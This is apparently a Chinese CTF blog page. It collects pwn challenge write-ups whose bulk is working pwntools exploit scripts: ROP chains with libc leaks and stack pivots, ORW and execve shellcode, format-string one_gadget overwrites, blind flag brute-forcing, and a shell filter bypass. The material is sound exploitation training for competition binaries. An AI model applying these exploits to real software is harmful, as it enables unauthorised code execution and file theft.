+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956131-254c6aef-baa6-46a3-81ef-c92fea4bf298.png"></p>
+<p>里面有leave rdi leave retn。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955700-51b61aa7-9fd2-48ae-b26a-26041d85bc91.png"></p>
+<p>查沙箱</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956066-a6f1ff79-565f-494c-a871-7392997b385c.png"></p>
+<p>沙箱这也有个lev。迁移泄露完libc之后从这再orw。就bss段写这的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955902-6d00eb08-b723-4508-8d43-8698b3554131.png"></p>
+<p>然后</p>
+<pre><code class="language-plain">from pwn import *
+import sys
+
+elf = ELF(&#39;./reread&#39;)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+p = remote(&#39;192.168.202.1&#39;,12229)
+
+#填充覆盖返回到vuln里的lev
+ok = b&#39;A&#39; * 0x40
+write_bss = p64(elf.bss(0x800))
+ret_addr1 = p64(0x4013ac)
+payload1 = ok + write_bss + ret_addr1
+p.send(payload1)
+
+#泄露libc的rop链
+pop_rdi = p64(0x401473)
+got_puts = p64(elf.got[&#39;puts&#39;])
+plt_puts = p64(elf.plt[&#39;puts&#39;])
+vuln_return = p64(0x401394)
+flag_path = b&#39;./flag\x00\x00&#39;
+payload2 = pop_rdi + got_puts + plt_puts + vuln_return + flag_path
+payload2 = payload2.ljust(0x40, b&#39;\x00&#39;)
+
+#设置泄露完libc的返回沙箱的lev
+write_bss2 = p64(elf.bss(0x7b8))
+ret_addr2  = p64(0x4012ec)
+payload2 += write_bss2 + ret_addr2
+p.send(payload2)
+
+#接收
+data = p.recvuntil(b&#39;\x7f&#39;)
+leaked_puts = data[-6:].ljust(8, b&#39;\x00&#39;)
+puts_addr = u64(leaked_puts)
+log.info(&quot;leak_puts: &quot; + hex(puts_addr))
+libc_base = puts_addr - libc.sym[&#39;puts&#39;]
+libc.address = libc_base
+log.success(&quot;leak_baselibc &quot; + hex(libc_base))
+
+
+pop_rdi_offset      = 0x000000000002601f
+pop_rsi_r12_offset = 0x0000000000119431
+pop_rax_offset      = 0x0000000000036174
+syscall_offset      = 0x00000000000630a9
+pop_rdi      = p64(libc_base + pop_rdi_offset)
+pop_rsi_r12  = p64(libc_base + pop_rsi_r12_offset)
+pop_rax      = p64(libc_base + pop_rax_offset)
+syscall_gadg = p64(libc_base + syscall_offset)
+
+#把写的rop全迁到bss上
+payload3 = b&#39;A&#39; * 0x40
+payload3 += p64(elf.bss(0xa00))
+payload3 += p64(0x4013ac)
+p.send(payload3)
+
+#set read读bss上迁好的数据。执行
+payload4 = pop_rdi + p64(0)
+payload4 += pop_rsi_r12 + p64(elf.bss(0x9f8))
+payload4 += pop_rsi_r12 + p64(0x400)
+payload4 += p64(elf.plt[&#39;read&#39;])
+payload4 += p64(elf.bss(0x9b8)) + p64(0x4012ec)
+p.send(payload4)
+
+#返回了沙箱执行orw
+orw = b&#39;&#39;
+orw += pop_rdi + p64(elf.bss(0x9f8))
+orw += pop_rsi_r12 + p64(0)
+orw += pop_rax
+orw += syscall_gadg
+
+orw += pop_rdi + p64(3)
+orw += pop_rsi_r12 + p64(elf.bss(0x100))
+orw += pop_rsi_r12 + p64(0x40)
+orw += pop_rax
+orw += syscall_gadg
+
+orw += pop_rdi + p64(1)
+orw += pop_rsi_r12 + p64(elf.bss(0x100))
+orw += pop_rsi_r12 + p64(0x40)
+orw += p64(libc_base + pop_rax_offset)
+orw += syscall_gadg
+
+orw2= orw.ljust(0x1f8, b&#39;\x00&#39;)
+data = b&#39;./flag\x00\x00&#39; + orw2
+p.send(data)
+
+p.interactive()
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956571-c257d3e6-91d5-4def-ac3e-cfe89df4f7a2.png"></p>
+<h2 id="Maze-Rust"><a href="#Maze-Rust" class="headerlink" title="Maze_Rust"></a>Maze_Rust</h2><p>看的官方题解的。输一个2有隐藏关。然后让输凌地宁宁留下的数字（柚子厨蒸鹅心）。</p>
+<p>然后0721输入进去。重进按三还有一关。它要解迷宫。输入最后的路径</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956583-19f84a9c-980e-415c-85ae-feca2059495a.png"></p>
+<p>0721判断方法要看v74的地址。因为主要我感觉wp里面说的它跟产生有关。实际上它就跟产生迷宫有关。之后这个stage2在产生这一块找的</p>
+<p>丢给ai看一下分析</p>
+<p>看一下反汇编。它这个是有一个stage1和2.0721已经做完了stage1.stage2还要别的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956863-85789519-dab1-4fc8-a7bc-6715d03f5563.png"></p>
+<p>跟着这个方法找一下函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956896-dc4456c0-d751-4844-a856-4d0726d59f91.png"></p>
+<p>来到了产生和debug函数这。看产生和debug后面这个长串的引用</p>
+<p>debug的另一个区域</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530957312-0d59ae06-86c5-467f-9795-16151df7c741.png"></p>
+<p>第一个输出完以后会有提示。让我们return main menu</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530957127-28caa587-420b-4007-a2b5-3e50d8bca34a.png"></p>
+<h1 id="hnctf"><a href="#hnctf" class="headerlink" title="hnctf"></a>hnctf</h1><h2 id="orw三步走"><a href="#orw三步走" class="headerlink" title="orw三步走"></a>orw三步走</h2><p>只写了一下shellcode的</p>
+<pre><code class="language-plain">payload = asm(&#39;&#39;&#39;
+    push 0x67616c66
+    mov rdi,rsp
+    xor esi,esi
+    push 2
+    pop rax
+    syscall
+
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall
+
+    mov edi,1                
+    mov rsi,rsp        
+    push 1
+    pop rax
+    syscall
+    &#39;&#39;&#39;)
+</code></pre>
+<h2 id="Orw-有or没有w-shellcode"><a href="#Orw-有or没有w-shellcode" class="headerlink" title="Orw 有or没有w |shellcode"></a>Orw 有or没有w |shellcode</h2><p>原来压缩包里给的exp我感觉能用，稍微改了一下没爆出来。</p>
+<pre><code class="language-plain">import os
+import sys
+import time
+from pwn import *
+from ctypes import *
+
+context.os = &#39;linux&#39;
+#context.log_level = &quot;debug&quot;
+
+#context(os = &#39;linux&#39;,log_level = &quot;debug&quot;,arch = &#39;amd64&#39;)
+s       = lambda data               :p.send(str(data))
+sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
+r       = lambda num                :p.recv(num)
+ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#39;\x00&#39;))
+uu64    = lambda data               :u64(data.ljust(8,b&#39;\x00&#39;))
+leak    = lambda name,addr          :log.success(&#39;&#123;&#125; = &#123;:#x&#125;&#39;.format(name, addr))
+l64     = lambda      :u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+l32     = lambda      :u32(p.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))
+context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
+
+x64_32 = 1
+
+if x64_32:
+    context.arch = &#39;amd64&#39;
+else:
+    context.arch = &#39;i386&#39;
+
+def exp(dis,char):
+    p.recvuntil(&quot;Enter your command:&quot;)
+    shellcode = asm(&#39;&#39;&#39;
+        mov r12,0x000067616c662f2e
+        push r12
+        mov rdi,rsp
+        xor esi,esi
+        xor edx,edx
+        mov rax,2
+        syscall
+        mov rdi,rax
+        mov rsi,rsp
+        mov edx,0x100
+        xor eax,eax
+        syscall
+        mov dl, byte ptr [rsi+&#123;&#125;]
+        mov cl, &#123;&#125;
+        cmp cl,dl
+        jz loop
+        mov eax,60
+        syscall
+        loop:
+        jmp loop
+        &#39;&#39;&#39;.format(dis,char))
+    #pause()
+    p.send(shellcode)
+    
+num_list = [48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122]
+flag = &quot;flag&#123;&quot;
+tmp = 0
+for i in range(len(flag),len(flag)+40):
+    if tmp == 1:
+            break
+    for j in num_list:
+        #p = process(&#39;./pwn&#39;)
+        p = remote(&#39;27.25.151.198&#39;,37467)
+        #gdb.attach(p,&#39;b *read&#39;)
+        try:
+            log.success(&quot;&#123;&#125; pos : &#123;&#125; trying&quot;.format(i,chr(j)))
+            exp(i,j)
+            p.recvline(timeout=10)
+            p.send(b&#39;\n&#39;)
+            log.success(&quot;&#123;&#125; pos : &#123;&#125; success&quot;.format(i,chr(j)))
+            flag += chr(j)
+            if chr(j) == &#39;&#125;&#39;:
+                    tmp = 1
+            p.close()
+            break
+        except:           
+            p.close()
+log.success(&quot;flag : &#123;&#125;&quot;.format(flag))
+</code></pre>
+<p>最开始原来自己写了一个。只爆出来字母了</p>
+<pre><code class="language-plain">from pwn import *
+import string
+import time
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+# context.log_level = &#39;debug&#39;
+
+def build_shellcode(cmd_str):
+    # 构造 execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, cmd_str], 0) 的 shellcode
+    # 注意：这里直接返回汇编字符串，而不是函数调用
+    return f&#39;&#39;&#39;
+        /* 将 &quot;/bin/sh&quot; 压入栈 */
+        mov rax, 0x68732f6e69622f
+        push rax
+        
+        /* 设置 rdi = &quot;/bin/sh&quot; */
+        mov rdi, rsp
+        
+        /* 构造 argv 数组 */
+        xor rax, rax
+        push rax        /* argv[3] = NULL */
+        
+        /* 将命令字符串压入栈并获取地址 */
+        lea rbx, [rel command]
+        push rbx        /* argv[2] = cmd_str */
+        
+        /* 压入 &quot;-c&quot; */
+        mov rbx, 0x632d
+        push rbx        /* argv[1] = &quot;-c&quot; */
+        
+        /* 设置 argv 数组 */
+        mov rsi, rsp    /* rsi = &amp;argv[1] */
+        
+        /* 压入程序名 */
+        push rdi        /* argv[0] = &quot;/bin/sh&quot; */
+        mov rsi, rsp    /* rsi = argv */
+        
+        /* 设置 rdx = envp (NULL) */
+        xor rdx, rdx
+        
+        /* 调用 execve */
+        mov rax, 59     /* SYS_execve */
+        syscall
+        
+        /* 退出 */
+        mov rax, 231
+        xor rdi, rdi
+        syscall
+        
+        command:
+            .asciz &quot;&#123;cmd_str&#125;&quot;
+    &#39;&#39;&#39;
+
+def check_char(pos, char):
+    # 构造测试命令 - 使用双引号避免单引号问题
+    cmd = f&quot;if [ $(dd if=flag bs=1 skip=&#123;pos&#125; count=1 2&gt;/dev/null) = \&quot;&#123;char&#125;\&quot; ]; then sleep 1; fi&quot;
+    print(f&quot;Testing position &#123;pos&#125; with char &#39;&#123;char&#125;&#39; - command: &#123;cmd&#125;&quot;)
+    
+    try:
+        # 构建 shellcode - 直接传递命令字符串
+        shellcode_str = build_shellcode(cmd)
+        sc = asm(shellcode_str)
+    except Exception as e:
+        print(f&quot;Error assembling shellcode: &#123;e&#125;&quot;)
+        return False
+    
+    # 发送并测量时间
+    try:
+        # p = process(&#39;./challenge&#39;)  # 本地测试
+        p = remote(&quot;127.0.0.1&quot;, 1337)  # 替换为实际目标
+        
+        start_time = time.time()
+        p.sendlineafter(&quot;Enter your command: &quot;, sc)
+        try:
+            # 设置较短超时以检测延迟
+            p.recv(timeout=0.5)
+        except:
+            pass
+        elapsed = time.time() - start_time
+        p.close()
+        
+        # 延迟超过 0.8 秒表示字符正确
+        return elapsed &gt; 0.8
+    except Exception as e:
+        print(f&quot;Connection error: &#123;e&#125;&quot;)
+        return False
+
+# 主函数
+def main():
+    # 可安全测试的字符集 (避免特殊字符)
+    safe_chars = string.ascii_letters + string.digits + &quot;_&#123;&#125;@$.-&quot;
+    
+    flag = &quot;&quot;
+    pos = 0
+    max_length = 50  # 假设flag最大长度
+    
+    while pos &quot;,hex(leak_addr))
+pie_base = leak_addr - 0x1060
+print(&quot;pie_base  is ==&gt;&quot;,hex(pie_base))
+
+read_gadgets_addr = 0x11B5 + pie_base
+bss_start = 0x4048 + pie_base + 0x600
+puts_plt = elf.plt.puts + pie_base
+main = 0x11A9  + pie_base
+
+payload = b&quot;a&quot;*0x20 + p64(bss_start) + p64(0x10F0 + pie_base) + p64(puts_plt)  + p64(main)
+
+
+p.sendline(payload)
+
+leak_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+log.success(&#39;leak_addr is  --&gt;&#39; + hex(leak_addr))
+
+libc_base = leak_addr - 0x21b780
+log.success(&#39;libc_base is  --&gt;&#39; + hex(libc_base))
+
+# gdb.attach(p)
+
+
+system = libc_base + libc.sym.system 
+binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
+pop_rdi = libc_base + 0x000000000002a3e5
+pop_rax = libc_base + 0x0000000000045eb0
+rdx_rsi_ret = libc_base + 0x000000000011f2e7
+syscall_ret = libc_base + 0x0000000000091316
+
+#payload = b&#39;a&#39;*0x28 + p64(pop_rdi) +p64(binsh) + p64(pop_rdi + 1) +p64(system)
+payload = b&quot;a&quot;*0x28 +  p64(pop_rax) + p64(0) + p64(rdx_rsi_ret) + p64(0x100) + p64(0) + p64(syscall_ret)
+
+p.sendline(payload)
+
+payload =b&#39;a&#39;*0x58+  p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(binsh) + p64(rdx_rsi_ret) + p64(0) + p64(0) + p64(0x000000000002be51+libc_base) + p64(0) + p64(syscall_ret) + p64(0)
+sleep(1)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="fd-it"><a href="#fd-it" class="headerlink" title="fd it"></a>fd it</h1><p>连上远程依次发送3，flag，1即可</p>
+<p>fd的用法</p>
+<h1 id="fmt-s"><a href="#fmt-s" class="headerlink" title="fmt_s"></a>fmt_s</h1><pre><code class="language-python">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p = process(&quot;./pwn&quot;)
+
+system_addr = 0x40127B
+
+payload = b&quot;SBA%13$p&quot;
+magic = b&quot;a&quot;*6 + b&quot;\x00&quot; + b&quot;\x0a&quot;
+p.recvuntil(&quot;You start talking to him...\n&quot;)
+# pause()
+p.sendline(payload)
+p.recvuntil(b&quot;SBA&quot;)
+
+leak_addr = int(p.recv(14),16)
+print(&quot;leak_addr  is ==&gt;&quot;,hex(leak_addr))
+libc_base = leak_addr - 0x29d90
+print(&quot;libc_base  is ==&gt;&quot;,hex(libc_base))
+
+p.recvuntil(&quot;You enraged the monster-prepare for battle!\n&quot;)
+
+# pause()
+p.send(magic)
+
+p.recvuntil(&quot;You start talking to him...\n&quot;)
+
+# pause()
+p.sendline(payload)
+
+p.recvuntil(&quot;You enraged the monster-prepare for battle!\n&quot;)
+
+# pause()
+p.send(magic)
+one_gadget = 0xebc81 + libc_base
+payload = &quot;%&#123;&#125;c&quot;.format(str(0x2d0)).encode() + b&quot;%36$hn&quot;
+payload = payload.ljust(0x10,b&quot;\x00&quot;)
+payload += p64(one_gadget)
+
+print(len(payload))
+p.recvuntil(&quot;You start talking to him...\n&quot;)
+# pause()
+p.sendline(payload)
+
+p.recvuntil(&quot;You enraged the monster-prepare for battle!\n&quot;)
+
+# pause()
+p.send(magic）
+p.interactive()
+</code></pre>
+<h1 id="fmt-2"><a href="#fmt-2" class="headerlink" title="fmt"></a>fmt</h1><pre><code class="language-python">from pwn import *
+import sys
+import re
+
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p = process(&quot;./pwn&quot;)
+elf = ELF(&quot;./pwn&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+payload = b&quot;%7$s%10$p&quot;
+p.sendline(payload)
+
+p.recvuntil(&quot;Nice to meet you,&quot;)
+
+data_line = p.recvline().strip()
+v4 = data_line[:5].decode()       
+s2_hex = data_line[5:].decode()  
+s2_value = int(s2_hex, 16)      
+
+print(f&quot;v4 = &#123;v4&#125;&quot;)
+print(f&quot;s2 = &#123;hex(s2_value)&#125;&quot;)
+s2_bytes = s2_value.to_bytes(8, &#39;little&#39;)
+s2 = s2_bytes[:5]  
+p.recvuntil(&quot;I buried two treasures on the stack.Can you find them?&quot;)
+
+# gdb.attach(p)
+
+p.sendline(s2)
+
+p.recvuntil(&quot;Yeah,another one?\n&quot;)
+
+p.sendline(v4)
+
+p.interactive()
+</code></pre>
+<h1 id="laker"><a href="#laker" class="headerlink" title="laker"></a>laker</h1><p>栈上有残留的数据，关键是要确定发xdulaker发到哪个位置，多少偏移。</p>
+<pre><code class="language-python">from pwn import *
+context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+
+p=remote(&#39;192.168.202.1&#39;,59690)
+#p = process(&#39;./laker&#39;)
+elf = ELF(&#39;./laker&#39;)
+
+p.sendline(b&quot;1&quot;)
+line = p.recvline_contains(b&#39;gift&#39;)
+addr = line.strip().split(b&#39;:&#39;)[-1]
+leak = int(addr, 16)
+log.success(f&quot;Leaked address: &#123;hex(leak)&#125;&quot;)
+
+base = leak - elf.symbols[&#39;opt&#39;]
+backdoor = base + elf.symbols[&#39;backdoor&#39;]
+log.success(f&quot;PIE base = &#123;hex(base)&#125;&quot;)
+
+p.sendline(b&quot;2&quot;)
+p.recvuntil(b&quot;Hey,what&#39;s your name?!\n&quot;)
+payload = b&#39;A&#39;*32+b&quot;xdulaker&quot; 
+p.send(payload)
+p.recvuntil(b&quot;I will teach you a lesson.\n&quot;)
+
+ret = base+0x000000000000101a
+p.sendline(b&quot;3&quot;)
+offset = 0x38
+payload = b&#39;A&#39;*offset+p64(ret)+p64(backdoor)
+
+p.send(payload)
+p.interactive()
+</code></pre>
+<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>写了一个脚本</p>
+<pre><code class="language-python">from pwn import *
+import sys
+import ctypes
+
+p = process(&quot;./pwn&quot;)
+
+def simulate_seed_transformation(init_seed):
+    &quot;&quot;&quot;模拟种子变换过程（不依赖libc）&quot;&quot;&quot;
+    seed = init_seed
+
+    for _ in range(120):
+        if seed &amp; 1:
+            seed = (3 * seed + 1) &amp; 0xFFFFFFFF
+        else:
+            seed = seed &gt;&gt; 1
+
+    while seed % 2 == 0:
+        if seed &amp; 1:
+            seed = (3 * seed + 1) &amp; 0xFFFFFFFF
+        else:
+            seed = seed &gt;&gt; 1
+    return seed
+
+def main():
+    
+    libc_path = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;  # 替换为实际libc路径
+    
+    try:
+        libc = ctypes.CDLL(libc_path)
+    except:
+        log.error(f&quot;无法加载libc: &#123;libc_path&#125;&quot;)
+        return
+    
+    for init_seed in range(1, 101):
+        try:
+            #r = remote(host, port)
+            r = process(&quot;./pwn&quot;)
+            r.recvuntil(&quot;My lock looks strange—can you help me?&quot;)
+            
+            final_seed = simulate_seed_transformation(init_seed)
+            libc.srand(final_seed)
+            
+            passwords = []
+            for i in range(10):
+                rand_val = libc.rand() % 10000
+                passwords.append(str(rand_val))
+            
+            for i in range(10):
+                r.recvuntil(f&quot;password &#123;i+1&#125;\n&gt;&quot;)
+                r.sendline(passwords[i])
+            
+            response = r.recvline(timeout=1)
+            if b&#39;It opened&#39; in response:
+                flag = r.recvall().decode()
+                log.success(f&quot;成功! 种子=&#123;init_seed&#125;, flag=&#123;flag&#125;&quot;)
+                r.close()
+                return
+            r.close()
+        except Exception as e:
+            log.warning(f&quot;种子 &#123;init_seed&#125; 失败: &#123;str(e)&#125;&quot;)
+            try: r.close()
+            except: pass
+    
+    log.error(&quot;所有种子尝试失败&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+p.interactive()
+</code></pre>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><pre><code class="language-python">from pwn import *
+
+context.clear()
+context.os   = &#39;linux&#39;
+context.arch = &#39;amd64&#39;        
+context.log_level = &#39;info&#39;    
+
+
+sc = b&quot;\x48\x31\xff\x48\x8d\x3d\x00\x00\x00\x00\x48\x31\xf6\xb8\x3b\x00\x00\x00\x0f\x05\x48\x65\x66\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;   
+
+p = process(b&#39;./shellcode&#39;)
+
+
+p.sendline(b&#39;4&#39;)              
+
+p.send(sc)
+
+p.interactive()
+</code></pre>
+<h1 id="str"><a href="#str" class="headerlink" title="str_"></a>str_</h1><pre><code class="language-python">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p = process(&quot;./pwn&quot;)
+elf = ELF(&quot;./pwn&quot;)
+
+
+p = process(&#39;./pwn&#39;) 
+# p = remote(&#39;host&#39;, port)  
+
+str_input = b&quot;meowmeow&quot; + b&quot;\x00&quot; * 0x20 + p64(0x40123B) 
+n_input = str(0x30) 
+
+p.recvuntil(&quot;What can u say?&quot;)
+p.sendline(str_input)
+p.recvuntil(&quot;So,what size is it?&quot;)
+
+p.sendline(n_input)
+
+
+p.interactive()
+</code></pre>
+<h1 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h1><p>-32是要算一下一个精确的数</p>
+<p>系统调用写在bss 。read 0x100不够</p>
+<pre><code class="language-python">from pwn import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)  
+exe = context.binary = ELF(&#39;./syslock&#39;)
+io = process(&#39;./syslock&#39;)
+
+
+io.recvuntil(b&#39;choose mode&#39;)
+io.sendline(b&#39;-32&#39;)
+
+io.recvuntil(b&#39;Input your password&#39;)
+payload1 = b&#39;\x3b\x00\x00\x00&#39; + b&#39;A&#39; * 8  
+io.sendline(payload1)
+
+print(io.recvall(timeout=1))
+
+pop_rdi=0x0000000000401240 
+pop_rax=0x0000000000401244 
+pop_rsi=0x0000000000401241
+pop_rdx=0x0000000000401242
+syscall=0x0000000000401230 
+#binsh = next(exe.search(b&#39;/bin/sh\x00&#39;))
+bss_addr  = exe.bss() + 0x500
+read_plt  = exe.plt.get(&#39;read&#39;)
+
+stage1  = b&#39;A&#39; * (64+8)
+stage1 += p64(pop_rdi) + p64(0)            # rdi = 0 (stdin)
+stage1 += p64(pop_rsi) + p64(bss_addr)     # rsi = .bss
+stage1 += p64(pop_rdx) + p64(8)            # rdx = 8
+stage1 += p64(read_plt)                    # read(0, .bss, 8)
+
+stage2  = p64(pop_rax) + p64(59)           # rax = 59 (execve)
+stage2 += p64(pop_rdi) + p64(bss_addr)     # rdi = &amp;&quot;/bin/sh&quot;
+stage2 += p64(pop_rsi) + p64(0)            # rsi = 0
+stage2 += p64(pop_rdx) + p64(0)            # rdx = 0
+stage2 += p64(syscall)                     # syscall
+
+payload = stage1 + stage2
+
+#io.recvuntil(b&#39;Developer Mode.\n&#39;)
+log.info(&quot;Sending payload now...&quot;)
+io.send(payload)
+log.info(&quot;Payload sent, now sending /bin/sh...&quot;)
+io.send(b&quot;/bin/sh\x00&quot;)
+log.info(&quot;Sent second input, now switching to interactive&quot;)
+io.interactive()
+
+io.interactive()
+</code></pre>
+<h1 id="u64"><a href="#u64" class="headerlink" title="u64"></a>u64</h1><pre><code class="language-python">from pwn import *
+
+#p = process(&#39;./u64&#39;)   
+p = remote(&#39;192.168.202.1&#39;,32409)  
+
+elf = ELF(&#39;./u64&#39;)
+
+p.recvuntil(b&quot;Here is the hint.&quot;)
+leak = p.recvn(8) 
+num = u64(leak)  
+
+log.success(f&quot;Leaked num: &#123;num&#125;&quot;)
+p.recvuntil(b&quot;&gt;&quot;)
+p.sendline(str(num).encode())
+
+p.interactive()
+</code></pre>
+<h1 id="认识libc"><a href="#认识libc" class="headerlink" title="认识libc"></a>认识libc</h1><p>不知道为什么本地打不通，远程能打通。接收printf的地址有问题</p>
+<pre><code class="language-python">from pwn import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;) 
+
+#p=process(&#39;./pre_libc&#39;)
+e =ELF(&quot;./pre_libc&quot;)
+libc = ELF(&quot;libc.so.6&quot;)
+p=remote(&#39;192.168.202.1&#39;,15964)
+
+p.recvuntil(b&quot;location of &#39;printf&#39;: &quot;)  
+printf_addr=int(p.recv(14),16)
+log.success(f&quot;printf @ &#123;hex(printf_addr)&#125;&quot;)
+
+ret=0x000000000040101a
+libc_base = printf_addr - libc.symbols[&#39;printf&#39;]
+pop_rdi_ret = libc_base + 0x2a3e5
+system= libc_base + libc.symbols[&#39;system&#39;]
+binsh = libc_base + next(libc.search(b&quot;/bin/sh&quot;))  
+
+payload=b&#39;A&#39;*0x48
+payload+=p64(ret)
+payload+=p64(pop_rdi_ret)
+payload+=p64(binsh)
+payload+=p64(system)
+
+#p.recvuntil(b&quot;&gt;&quot;) 
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="litctf"><a href="#litctf" class="headerlink" title="litctf"></a>litctf</h1><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530692554-0e40cac5-1510-4ae6-b27d-78000fb7e6fe.png"></p>
+<p>禁用了黑名单里</p>
+<p>这个题想起来刚开始学pwn的时候那个视频里有一个例题</p>
+<p>刚好限制了cat的读取,说要用斜杠ca\t来绕过过滤</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ja4y1u7h3/?spm_id_from=333.1387.upload.video_card.click&vd_source=1fb0c97000e2d50f993f94e726040b6f">https://www.bilibili.com/video/BV1Ja4y1u7h3/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=1fb0c97000e2d50f993f94e726040b6f</a></p>
+<p>那会问完才想起来自己以前见过这种。</p>
+<p>当时还没清楚要先发sh拿到控制权。就直接ca\t 来绕过过滤</p>
+<p>一些常见</p>
+<p>$0 是sh $IFS$9 是空格</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/391439312">https://zhuanlan.zhihu.com/p/391439312</a></p>
+<p>这道题</p>
+<pre><code class="language-plain">$0
+ca\t$IFS$9flag
+</code></pre>
+<p>就可以</p>
+<h2 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h2><p>轩辕杯那个shellcode没有写。好像和这个差不多？</p>
+<p>叫shellcode里面都有沙箱。</p>
+<p>我感觉这种题是要用shellcode把绕过的沙箱写出来</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530692523-ffed45ba-f51c-4687-9a8d-a04833d8abf4.png"></p>
+<p>想着应该爆破。爆破还没学。先到这</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZZPYwEcXTiZLBpkgPdYcVQGYn7f">沙箱没总结完，就基本没写</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #03a9f4">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #ffa2c4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/fmt/" style="color: #00a596">fmt</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/canary/" style="color: #ff7d73">canary</a>
+        </span>
+        
+    </div>
+    <a href="/2025/08/01/CTF%E6%AF%94%E8%B5%9B%E5%92%8C%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/07/25/%E8%99%9A%E5%87%BD%E6%95%B0%E5%92%8Cmalloc_hook/">
+        <h2 class="post-title">虚函数与 malloc_hook 利用</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/25
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h1><p>虚函数。虚函数在开头有个指针列表，用来维护虚函数的指针</p>
+<p>虚表指针对应类的虚函数表地址</p>
+<p>通过基类调用虚函数时，对象的虚表指针找到对应的虚函数表。调用表内的相应地址，实现动态绑定。</p>
+<p>纯虚函数是在基类里面定义但没有实现的类。</p>
+<p>没有实现的类的主要作用是作为接口的定义，强制派生类必须实现纯虚函数。</p>
+<p>c＋＋里有虚函数，c语言里有类似的定义和实现，好像也是为了实现和c＋＋里虚函数一样的功能</p>
+<p>main函数。中间的listen是用来调用虚函数的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064610-4308d5d3-b338-46ce-be5d-2a36cf283727.png"></p>
+<p>看一下remove。没有uaf，它做了处理。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064685-1a020891-b794-4caa-88e7-740d1f109266.png"></p>
+<p>一开始找不见漏洞。没有uaf，堆溢出也不知道溢出哪个</p>
+<p>Checksec 一下发现没有nx。方便写shellcode</p>
